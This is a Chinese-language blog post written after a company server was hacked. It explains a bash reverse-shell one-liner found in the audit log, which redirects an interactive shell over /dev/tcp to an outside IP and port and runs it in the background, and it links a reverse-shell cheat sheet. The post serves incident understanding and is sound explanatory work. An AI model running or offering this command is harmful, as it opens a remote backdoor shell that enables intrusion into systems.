---
layout: post
title: 单行反弹Shell命令的理解
description: "单行反弹Shell命令的理解"
category: Shell
avatarimg:
tags: [Security, Linux, Shell, Bash]
duoshuo: true
---

公司的一台服务器被黑客入侵了。。。安全没做好！！！
查看bash审计日志，发现黑客执行的相关命令，其中有一条反弹Shell的命令，在被黑的服务器上执行如下：
> bash -i >& /dev/tcp/173.208.201.162/9083 0>&1 &

执行后的效果就是黑客在自己的机器上利用nc等工具监听9083端口，不仅可以发送命令到被黑服务器上，命令的输出也会回显到黑客的机器上，整个表现就是被黑服务器的Shell反弹到黑客机器上了，和SSH远程登录一台服务器执行命令一样。。。

理解上面的单行命令，费了好半天，看来对bash shell的掌握还不够啊。

- 首先， bash -i开启了Shell的交互模式，这样反弹Shell后，黑客可以和它交互；
- 然后是这段： >& /dev/tcp/173.208.201.162/9083，表示bash打开到远程目标IP端口的TCP连接，并将标准出重定向到远程目标IP端口上；
- 再然后是这段：0>&1，表示标准输入（这个标准输入是在远端执行的）也重定向到远程目标IP端口上？（PS: 这里我不是很好理解，如果高手看到请指点一下。）
- 最后的&表示后台运行，这样就相当于常驻后台的后门了。

我不得不感叹，第一个想出这种用法的人真是变态啊，算是奇技淫巧，对bash shell的掌握很深入了。

**Refercences:**   
[交互式shell和非交互式shell](http://blog.csdn.net/trochiluses/article/details/13767669)  
[Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)  
[REVERSE SHELL WITH BASH](http://www.gnucitizen.org/blog/reverse-shell-with-bash/)  
[What is the difference between &> and >& in bash?](http://superuser.com/questions/335396/what-is-the-difference-between-and-in-bash)
